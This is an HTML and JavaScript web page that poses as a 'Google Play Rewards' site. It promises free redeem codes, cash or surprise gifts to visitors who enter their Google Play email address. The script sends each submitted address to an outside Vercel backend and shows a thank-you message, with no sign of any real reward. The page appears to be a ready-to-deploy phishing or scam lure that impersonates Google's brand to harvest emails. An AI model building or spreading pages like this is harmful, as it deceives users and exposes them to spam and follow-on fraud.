<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Google Play Rewards</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { 
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
      background: linear-gradient(135deg,#667eea,#764ba2); 
      color:#fff; 
      min-height:100vh; 
      display:flex; 
      flex-direction:column;
    }
    header { 
      display:flex; 
      align-items:center; 
      padding:1rem 2rem; 
      background:rgba(255,255,255,0.1); 
      backdrop-filter:blur(10px);
    }
    header img { height:50px; margin-right:1rem; }
    header h1 { font-size:1.8rem; }
    main { flex:1; display:flex; justify-content:center; align-items:center; padding:2rem; }
    .landing { display:flex; max-width:1200px; width:100%; gap:2rem; align-items:center; }
    .landing-left { flex:1; animation: slideInLeft 1s forwards; }
    .landing-left h1 { font-size:2.5rem; margin-bottom:1rem; text-shadow:2px 2px 5px rgba(0,0,0,0.3); }
    .landing-left p { font-size:1.2rem; margin-bottom:2rem; opacity:0.9; }
    .btn-primary { padding:1rem 2rem; font-size:1.2rem; border:none; border-radius:50px; cursor:pointer; background:linear-gradient(45deg,#ff6b6b,#ff8e53); color:#fff; box-shadow:0 4px 15px rgba(255,107,107,0.4); transition:0.3s; }
    .btn-primary:hover { transform:translateY(-3px); box-shadow:0 6px 20px rgba(255,107,107,0.6); }
    .landing-right { flex:1; display:flex; justify-content:center; align-items:center; animation: slideInRight 1s forwards; }
    .landing-right img { max-width:100%; border-radius:15px; box-shadow:0 10px 25px rgba(0,0,0,0.2); }

    .view { display:none; flex-direction:column; align-items:center; animation:fadeIn 0.5s; width:100%; max-width:900px; }
    .view.active { display:flex; }

    .options-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(200px,1fr)); gap:1.5rem; margin:2rem 0; width:100%; max-width:900px; }
    .option-card { background:#fff; color:#333; border-radius:15px; padding:1.5rem; text-align:center; cursor:pointer; transition:0.3s; box-shadow:0 5px 15px rgba(0,0,0,0.1); display:flex; flex-direction:column; justify-content:space-between; }
    .option-card img { height:80px; margin-bottom:1rem; }
    .option-card h3 { margin-bottom:0.5rem; }
    .option-card .claim-btn { background:linear-gradient(45deg,#42b883,#33a473); color:white; padding:0.75rem 1.5rem; border-radius:8px; border:none; cursor:pointer; font-weight:600; font-size:0.9rem; margin-top:1rem; transition:all 0.3s ease; box-shadow:0 4px 10px rgba(66,184,131,0.4); }
    .option-card .claim-btn:hover { transform:translateY(-2px); box-shadow:0 6px 15px rgba(66,184,131,0.5); }
    .option-card:hover { transform:translateY(-5px); box-shadow:0 10px 25px rgba(0,0,0,0.15); }

    /* Form */
    .form-view { background:linear-gradient(145deg,#ffffff,#f0f4f8); color:#333; padding:3rem 2.5rem; border-radius:20px; max-width:500px; margin:4rem auto; box-shadow:0 12px 35px rgba(0,0,0,0.15); transition:all 0.3s ease; position:relative; }
    .form-view h2 { text-align:center; margin-bottom:2rem; font-size:2rem; color:#4a4a4a; font-weight:700; }
    .form-group { margin-bottom:1.8rem; }
    .form-group label { display:block; margin-bottom:0.5rem; font-weight:600; color:#555; font-size:0.95rem; }
    .form-group input { width:100%; padding:1.2rem 1rem; border:1.8px solid #ccc; border-radius:12px; font-size:1rem; color:#333; transition:all 0.3s ease; box-shadow:inset 0 2px 5px rgba(0,0,0,0.05); }
    .form-group input:focus { outline:none; border-color:#667eea; box-shadow:0 0 10px rgba(102,126,234,0.3); }
    .form-buttons { display:flex; gap:1rem; justify-content:center; flex-wrap:wrap; margin-top:1rem; }
    .submit-btn { background:linear-gradient(45deg,#667eea,#764ba2); color:white; padding:0.9rem 2.2rem; border-radius:12px; border:none; cursor:pointer; font-weight:600; font-size:1rem; transition:all 0.3s ease; box-shadow:0 6px 15px rgba(102,126,234,0.4); }
    .submit-btn:hover { transform:translateY(-3px); box-shadow:0 10px 25px rgba(102,126,234,0.5); }
    .back-btn { background:#f1f1f1; color:#333; padding:0.9rem 2.2rem; border-radius:12px; border:none; cursor:pointer; font-weight:600; font-size:1rem; transition:all 0.3s ease; box-shadow:0 4px 12px rgba(0,0,0,0.1); }
    .back-btn:hover { background:#e1e1e1; transform:translateY(-2px); }

    footer { text-align:center; padding:1rem 0; background:rgba(255,255,255,0.1); backdrop-filter:blur(10px); }

    .popup-overlay { position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,0.7); display:none; justify-content:center; align-items:center; z-index:1000; }
    .popup-content { background:#fff; color:#333; padding:2rem; border-radius:15px; text-align:center; max-width:400px; width:90%; box-shadow:0 5px 25px rgba(0,0,0,0.2); }
    .close-btn { background:#42b883; color:#fff; padding:0.5rem 1.5rem; border:none; border-radius:8px; cursor:pointer; font-weight:600; }
    @keyframes fadeIn { from{opacity:0; transform:translateY(20px);} to{opacity:1; transform:translateY(0);} }
    @keyframes slideInLeft { from{opacity:0; transform:translateX(-50px);} to{opacity:1; transform:translateX(0);} }
    @keyframes slideInRight { from{opacity:0; transform:translateX(50px);} to{opacity:1; transform:translateX(0);} }

    /* Responsive */
    @media(max-width:768px){ 
      header { padding:0.8rem 1rem; }
      header h1 { font-size:1.5rem; }
      main { padding:1rem; }
      .landing { flex-direction:column; text-align:center; }
      .landing-left h1{ font-size:2rem; }
      .landing-left p { font-size:1rem; }
      .btn-primary { padding:0.8rem 1.5rem; font-size:1rem; }
      .landing-right img { max-width:80%; }
      .options-grid { grid-template-columns:1fr; padding:0 1rem; }
      .option-card { padding:1rem; }
      .option-card img { height:60px; }
      .form-view { padding:2rem 1.5rem; margin:2rem auto; }
      .form-view h2 { font-size:1.5rem; }
      .form-group input { padding:1rem 0.8rem; font-size:0.9rem; }
      .form-buttons { flex-direction:column; }
      .submit-btn, .back-btn { width:100%; padding:0.8rem 1.5rem; font-size:0.9rem; }
    }
  </style>
</head>
<body>
  <header>
    <img src="https://img.icons8.com/color/48/000000/google-play.png" alt="Logo">
    <h1>Google Play Rewards</h1>
  </header>

  <main>
    <!-- Landing Page -->
    <div class="landing" id="landing">
      <div class="landing-left">
        <h1>Claim Your Special Rewards Today!</h1>
        <p>Get Google Play codes, cash rewards, or surprise gifts instantly by signing up with your Google Play email.</p>
        <button class="btn-primary" onclick="showView('optionsView')">Get Started</button>
      </div>
      <div class="landing-right">
        <img src="https://img.icons8.com/color/400/000000/google-play.png" alt="Google Play Rewards">
      </div>
    </div>

    <!-- Options View -->
    <div class="view" id="optionsView">
      <h2>Select Your Reward</h2>
      <div class="options-grid">
        <div class="option-card">
          <img src="https://img.icons8.com/color/96/000000/gift.png" alt="Redeem Code">
          <h3>Redeem Code</h3>
          <p>Get a Google Play redeem code</p>
          <button class="claim-btn" onclick="selectOption('redeem')">Claim Reward</button>
        </div>
        <div class="option-card">
          <img src="https://img.icons8.com/color/96/000000/money-bag.png" alt="Cash Reward">
          <h3>Cash Reward</h3>
          <p>Claim your cash reward</p>
          <button class="claim-btn" onclick="selectOption('cash')">Claim Reward</button>
        </div>
        <div class="option-card">
          <img src="https://img.icons8.com/color/96/000000/confetti.png" alt="Surprise Gift">
          <h3>Surprise Gift</h3>
          <p>A special surprise awaits you</p>
          <button class="claim-btn" onclick="selectOption('surprise')">Claim Reward</button>
        </div>
      </div>
      <button class="back-btn" onclick="showView('landing')">Back</button>
    </div>

    <!-- Form View -->
    <div class="view form-view" id="formView">
      <h2>Enter Your Details</h2>
      <form id="rewardForm">
        <div class="form-group">
          <label for="email">Google Play Signed Email ID</label>
          <input type="email" id="email" placeholder="Enter your email" required>
        </div>
        <div class="form-buttons">
          <button type="submit" class="submit-btn">Submit</button>
          <button type="button" class="back-btn" onclick="showView('optionsView')">Back</button>
        </div>
      </form>
    </div>
  </main>

  <footer>
    © 2025 Google Play Rewards. All rights reserved.
  </footer>

  <!-- Popup -->
  <div class="popup-overlay" id="popup">
    <div class="popup-content">
      <h3>Thank You!</h3>
      <p>Thanks for submitting! You will get your gift soon to your mail. Keep checking your mail.</p>
      <button class="close-btn" onclick="closePopup()">OK</button>
    </div>
  </div>

<script>
  document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('rewardForm');
    const popup = document.getElementById('popup');
    let selectedOption = '';

    // ✅ Replace with your deployed backend URL
    const BACKEND_URL = 'https://app-delta-two-95.vercel.app/';

    // Show/hide views
    window.showView = (viewId) => {
      document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
      document.getElementById('landing').style.display = 'none';

      if(viewId === 'landing') {
        document.getElementById('landing').style.display = 'flex';
      } else {
        document.getElementById(viewId).classList.add('active');
      }
    };

    // Select reward option
    window.selectOption = (option) => {
      selectedOption = option;
      showView('formView');
    };

    // Handle form submission
    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const email = document.getElementById('email').value.trim();
      if (!email || !email.includes('@')) {
        alert('Please enter a valid email');
        return;
      }

      try {
        const response = await fetch(`${BACKEND_URL}/submit`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ email, option: selectedOption })
        });

        if (!response.ok) throw new Error(`Failed to submit: ${response.statusText}`);

        popup.style.display = 'flex';
        form.reset();
      } catch (err) {
        alert(`There was an issue submitting your request. Please try again later. (Error: ${err.message})`);
        console.error("Submission error:", err);
      }
    });

    // Popup close
    window.closePopup = () => {
      popup.style.display = 'none';
      showView('landing');
    };

    // Close popup if clicking outside
    popup.addEventListener('click', (e) => {
      if (e.target === popup) closePopup();
    });
  });
</script>
</body>
</html>

